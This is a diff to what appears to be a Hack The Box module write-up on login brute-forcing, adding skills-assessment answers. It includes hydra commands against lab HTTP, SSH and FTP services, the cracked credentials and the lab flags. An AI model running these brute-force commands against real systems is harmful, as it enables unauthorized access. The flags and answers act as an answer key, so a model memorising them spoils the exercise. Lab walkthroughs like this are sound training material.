@@ -11,6 +11,10 @@
     1. [Web Services](#web-services)
 4. [Custom Wordlists](#custom-wordlists)
     1. [Custom Wordlists](#custom-wordlists-1)
+5. [Skills Assessment](#skills-assessment)
+    1. [Skills Assessment Part 1](#skills-assessment-part-1)
+    2. [Skills Assessment Part 2](#skills-assessment-part-2)
+
 
 ## Brute Force Attacks
 ### Brute Force Attacks
@@ -183,3 +187,51 @@
     hydra -L jane_smith_usernames.txt -P jane-filtered.txt 83.136.253.5 -s 42961 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
     ```
     We will find the correct credential, `jane:3n4J!!`. The answer is `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`.
+
+## Skills Assessment
+### Skills Assessment Part 1
+1. What is the password for the basic auth login?
+
+    We can use `hydra` to bruteforce basic auth login.
+
+    ```bash
+    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.249.164 http-get / -s 55963 -t 4
+    ```
+    We will get this credential, `admin:Admin123`. The answer is `Admin123`.
+
+2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?
+
+    We can use the credential that we have found in the previous to login. We will get the username on there. The answer is `satwossh`.
+
+### Skills Assessment Part 2
+1. What is the username of the ftp user you find via brute-forcing?
+
+    In the previous, we have found `satwossh` username. If we check via `nmap` what service is on the port given by the challenge, we will know that it is ssh service. So we can use hydra to find the password.
+
+    ```bash
+    hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://94.237.55.124 -s 32394
+    ```
+    The password is `password1`. We can login via ssh with the credential. Once we have login, we can see several files in there.
+
+    ![alt text](<Assets/Skills Assessment Part 2 - 1.png>)
+
+    Based on that, we have information that `Thomas Smith` has access to the ftp service. We can use `username-anarchy` tp generate possible username.
+
+    ```bash
+    username-anarchy Thomas Smith > usernames.txt
+    ```
+    Then, we can use `hydra` to bruteforce ftp login.
+    
+    ```bash
+    hydra -L usernames.txt -P passwords.txt ftp://localhost
+    ```
+    We will find this credential, `thomas:chocolate!`. The answer is `thomas`.
+
+2. What is the flag contained within flag.txt
+
+    We can use the credential to login ftp.
+
+    ```bash
+    ftp ftp://thomas:'chocolate!'@localhost
+    ```
+    Once we have login, we can find the flag in there. The answer is `HTB{brut3f0rc1ng_succ3ssful}`.
